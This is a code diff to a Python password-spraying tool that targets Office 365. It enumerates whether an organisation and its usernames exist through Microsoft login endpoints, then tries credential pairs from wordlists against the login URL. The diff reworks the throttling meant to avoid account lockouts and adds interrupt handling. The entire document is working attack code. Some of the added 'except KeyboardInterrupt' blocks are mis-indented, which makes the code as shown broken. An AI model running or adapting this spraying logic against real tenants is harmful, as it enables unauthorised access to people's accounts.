@@ -86,11 +86,8 @@ def banner():
     print(Fore.GREEN+banner)
 
 # Bruteforcing for userdetails
-def brute_office(username, password):
+def brute_office(username, password, check_user):
     try:
-        print(Fore.YELLOW +
-              "Checking credentials {0}:{1}".format(username, password))
-        check_user = check_o365(username)
         if(check_user == None):
             print(
                 Fore.RED+"[+] Error! Target does not seem to be using Office365")
@@ -107,12 +104,12 @@ def brute_office(username, password):
             r = requests.options(LOGIN_URL, headers=header,
                                  auth=(username, password), timeout=300)
 
-            color = Fore.GREEN+"Login Found: " if r.status_code == 200 else Fore.RED+"Invalid Login: "
-            print(color+"{}:{} - {}".format(username,
+            color = Fore.GREEN+"VALID" if r.status_code == 200 else Fore.RED+"INVALID"
+            print("[] {}:{} - {}".format(color, username,
                                             password, STATUS_CODES[str(r.status_code)]))
 
         elif(check_user == False):
-            print(Fore.RED+"[+] Error! Invalid username")
+            print(Fore.RED+"[+] Error! Invalid username: {}".format(username))
         else:
             print(Fore.RED+"[+] Error! Unknown Error")
             sys.exit(0)
@@ -127,8 +124,6 @@ def brute_office(username, password):
 
 # checking if an organization uses o365 and checking if a user exist
 def check_o365(username):
-    if verbose:
-        print(Fore.YELLOW + "[!]Checking username: {}".format(username))
     s = requests.session()
     url = 'https://login.microsoftonline.com/getuserrealm.srf?login=%s&json=1' % username
     r = s.get(url)
@@ -138,7 +133,6 @@ def check_o365(username):
     if unknown:
         return None
     if managed:
-        sleep(1)
         uri = 'https://login.microsoftonline.com/common/GetCredentialType'
         username = username.split()
         username = ' '.join(username)
@@ -154,54 +148,72 @@ def check_o365(username):
 
 
 def hybrid_office_worker(policy, user, _pass):
-    attempts = 1
     
+    attempts = 1
     max_attempts, timelimit = tuple(policy.split(','))
-    timelimit = 60*int(timelimit)
-    max_attempts = int(max_attempts) - 1
+    timelimit = int(timelimit)
+    max_attempts = int(max_attempts)
 
     if isinstance(user, str)and isinstance(_pass, io.TextIOWrapper):
         # this shows we are spraying a single username against a passfile
+        check_user = check_o365(user)
         try:
             for password in _pass.readlines():
                 # This is where we will apply our password policy
+                brute_office(user, password.strip("\n"), check_user)
                 if attempts == max_attempts:
+                    print("[*]Sleeping, Next spray in: {} seconds".format(timelimit))
                     sleep(timelimit)
-                    attempts = 1
-                brute_office(user, password.strip("\n"))
+                    attempts = 0
                 attempts = attempts + 1
-                sleep(timelimit//max_attempts)
         except Exception as e:
             print(e)
+
+        except KeyboardInterrupt:
+        print(Fore.RED+"[!] Detected Ctrl + C. Shutting down...")
+        sys.exit(0)
 
     elif isinstance(_pass, str) and isinstance(user, io.TextIOWrapper):
         # this shows we are spraying a single password against a userfile
         try:
             for username in user.readlines():
+                check_user = check_o365(username)
                 # This is where we will apply our password policy
+                brute_office(username.strip("\n"), _pass, check_user)
                 if attempts == max_attempts:
+                    print("[*]Sleeping, Next spray in: {} seconds".format(timelimit))
                     sleep(timelimit)
-                    attempts = 1
-                brute_office(username.strip("\n"), _pass)
+                    attempts = 0
                 attempts = attempts + 1
-                sleep(timelimit//max_attempts)
         except Exception as e:
             print(e)
+            
+        except KeyboardInterrupt:
+        print(Fore.RED+"[!] Detected Ctrl + C. Shutting down...")
+        sys.exit(0)
 
     elif isinstance(user, io.TextIOWrapper) and isinstance(_pass, io.TextIOWrapper):
         # this means we are spraying userfile against passfile.
         try:
-            for password in _pass.readlines():
-                for username in user.readlines():
-                    if attempts == max_attempts:
-                        sleep(timelimit)
-                        attempts = 1
-                    brute_office(username.strip("\n"), password.strip("\n"))
-                    attempts = attempts + 1
-                    sleep(timelimit//max_attempts)
+            userfile = user.readlines()
+            passfile = _pass.readlines()
+            for password in passfile:
+                for username in userfile:
+                    check_user = check_o365(username)
+                    brute_office(username.strip("\n"), password.strip("\n"), check_user)
+                if attempts == max_attempts:
+                    print("[*]Sleeping, Next spray in: {} seconds".format(timelimit))
+                    sleep(timelimit)
+                    attempts = 0
+                attempts = attempts + 1
+                
         except Exception as e:
             print(e)
             exit(0)
+            
+        except KeyboardInterrupt:
+        print(Fore.RED+"[!] Detected Ctrl + C. Shutting down...")
+        sys.exit(0)
 
     else:
         print(Fore.RED +"[!]Unknown input. Check the usage")
